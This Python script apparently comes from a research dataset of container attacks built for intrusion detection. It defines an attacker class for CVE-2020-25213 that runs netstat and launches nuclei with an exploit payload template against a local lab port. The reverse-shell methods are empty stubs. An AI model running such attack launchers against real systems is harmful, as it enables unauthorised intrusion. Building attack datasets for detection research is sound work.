from attackerBase import *
from attackConfig import *



class UUF_CVE_2020_25213_Attacker4(AttackerBase):
    
    def __init__(self):
        self.commandRunner = CommandRunner()



    def discovery(self) -> None:     
        #self.commandRunner.runCommand("pwd")
        #self.commandRunner.runCommand("cd ..")
        #self.commandRunner.runCommand('ls')
        self.commandRunner.runCommand('netstat -natp')

    def main(self):
        print("Main method started")
        #self.commandRunner.runCommand('echo "nuclei script started" ')     
        self.commandRunner.runCommand('nuclei -u http://localhost:30007 -t  ~/Desktop/TESTING_PHASE/Z/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2020-25213_payload3.yaml -debug')


    # Reverse shell will be handle later...
    def reverseShell(self):

        # init newTerminalThread
        # newTerminalThread -> Open terminal and run specific code ( it will wait) 


        # mainThread
        # Run another command1
        # Run another command2
        # Run another command3




        pass
    def reverseShell2(self):
        pass

#
def attackInvoker(attackerBase: AttackerBase):
    print("Invoked attack " + attackerBase.__class__.__name__)
    attackerBase.templateMethod()

if __name__ == '__main__':
    
    # Call your custom attacks here
    attackInvoker(UUF_CVE_2020_25213_Attacker1())
